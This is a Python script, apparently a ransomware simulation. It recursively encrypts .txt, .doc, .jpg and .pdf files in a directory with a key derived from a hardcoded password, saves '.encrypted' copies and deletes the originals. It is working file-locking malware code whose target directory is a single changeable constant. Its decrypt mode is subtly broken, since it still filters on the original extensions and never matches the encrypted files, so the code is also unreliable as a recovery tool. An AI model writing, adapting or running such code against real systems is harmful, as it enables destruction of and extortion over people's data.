import os
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Configuration
TARGET_DIR = "test_files"  # Directory to encrypt/decrypt
FILE_EXTENSIONS = ['.txt', '.doc', '.jpg', '.pdf']  # Target file types
SALT = b'fixed_salt_1234'  # For key derivation (must be consistent)
PASSWORD = "Abhishek!234@#$"  # Hardcoded decryption key

def derive_key():
    """Derive encryption key from password"""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=SALT,
        iterations=100000
    )
    return base64.urlsafe_b64encode(kdf.derive(PASSWORD.encode()))

def process_files(mode):
    """Encrypt/decrypt files in target directory"""
    key = derive_key()
    fernet = Fernet(key)
    
    for root, _, files in os.walk(TARGET_DIR):
        for file in files:
            if any(file.endswith(ext) for ext in FILE_EXTENSIONS):
                path = os.path.join(root, file)
                
                try:
                    with open(path, 'rb') as f:
                        data = f.read()
                    
                    # Process based on mode
                    if mode == 'encrypt':
                        new_data = fernet.encrypt(data)
                        new_path = path + '.encrypted'
                    else:  # decrypt
                        new_data = fernet.decrypt(data)
                        new_path = path.replace('.encrypted', '')
                    
                    # Write processed file
                    with open(new_path, 'wb') as f:
                        f.write(new_data)
                    
                    # Remove original file
                    os.remove(path)
                    print(f"Processed: {file}")
                        
                except Exception as e:
                    print(f"Error processing {file}: {str(e)}")

if __name__ == "__main__":
    # Create test directory if missing
    os.makedirs(TARGET_DIR, exist_ok=True)
    
    # Simulate ransomware behavior
    process_files('encrypt')
    print("\nFiles encrypted! To decrypt run with 'decrypt' mode\n")
    
    # To decrypt (normally would be separate):
    # process_files('decrypt')
